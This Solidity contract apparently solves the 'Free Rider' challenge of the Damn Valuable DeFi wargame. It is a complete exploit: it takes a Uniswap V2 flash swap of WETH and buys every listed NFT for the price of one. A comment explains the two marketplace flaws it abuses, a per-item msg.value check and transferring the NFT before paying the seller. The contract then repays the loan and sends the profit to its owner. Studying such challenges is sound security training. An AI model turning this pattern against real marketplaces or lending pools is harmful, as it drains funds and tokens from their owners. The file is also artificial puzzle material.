// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IUniswapV2Calee.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Factory.sol";

import "../DamnValuableNFT.sol";
import "./IWETH.sol";
import "./FreeRiderBuyer.sol";
import "./FreeRiderNFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";



contract FreeRiderExploit is IUniswapV2Callee, IERC721Receiver {    
    IWETH weth;
    IUniswapV2Factory factory;
    DamnValuableNFT nft;
    address payable owner;


    constructor(IUniswapV2Factory _factory, IWETH _weth, DamnValuableNFT _nft) {
        // Set up th exploiter variables
        weth = _weth;
        factory = _factory;
        nft = _nft;
        owner = payable(msg.sender);
    }

    // The contract needs to be able to receive ether.
    receive() external payable{}

    // Exploit function
    function exploit(IUniswapV2Pair pair, address buyer , address marketplace, uint256 price, uint256[] calldata tokenIds) external {
        // token0 is WETH; token1 is the other token

        // Get a flash loan of WETH via the available uniswap V2 pair. 
        // This happens by simply requesting a swap with the requested token0 out amount and setting the data parameter.
        pair.swap(
            price,
            0,
            address(this),
            abi.encode(price, buyer, marketplace, tokenIds)
        );
    }

    /**
     * UniswapV2 flash swap receiver function - callen when you request a swap and provide the call data parameter.
     */
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {
        
        // Double-check that the caller is a uniswap pair.        
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
        assert(
            msg.sender == factory.getPair(token0, token1)
        ); 
        
        // Decode our call data
        (uint256 price, address buyer, address marketplace, uint256[] memory tokenIds) = abi.decode(data, (uint256, address, address, uint256[]));
        weth.withdraw(weth.balanceOf(address(this)));

        /** 
            We can buy all tokens by just sending value for the price of one (the most expensive one).
            This happens because the msg.value received is checked for each buy inside the _buyOne function
            msg.value does not change for each time this function is called, so it doesn't matter how many NFTs
            we buy, as long as msg.value is >= the max NFT price.
            Another issue with the marketplace (_buyOne) is that it FIRST transfers the NFT, then it checks the owner
            and sends the priceToPay to them. At this point the owner is already the buyer... So you essentially get
            all the NFTs for the price of one.

            This only works because the balance of the marketplace is >= than the total value of the NFTs we exploited.
         */
        FreeRiderNFTMarketplace(payable(marketplace)).buyMany{value: price}(tokenIds);

        // Transfer all NFTs to the buyer
        for (uint256 i = 0; i < tokenIds.length; i++) {
            nft.safeTransferFrom(address(this), buyer, tokenIds[i]);     
        }

        // Calculate how much we need to repay for the flash loan
        uint256 loanDue = getSingleAmountIn(amount0);
        weth.deposit{value: loanDue}();

        // Pay back flash loan
        weth.transfer(msg.sender, loanDue);        


        owner.transfer(address(this).balance);
    }

    /**
     * Uniswap Utility function for calculating amount in for a flash loan
     */
    function getSingleAmountIn(uint256 amountOut)
        internal
        pure
        returns (uint256)
    {
        uint256 numerator = amountOut * 1000;
        return (numerator / 997) + 1;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 _tokenId,
        bytes calldata data
    ) 
        external
        override
        
        returns (bytes4) 
    {
        require(nft.ownerOf(_tokenId) == address(this));
        
        return IERC721Receiver.onERC721Received.selector;
    }
}
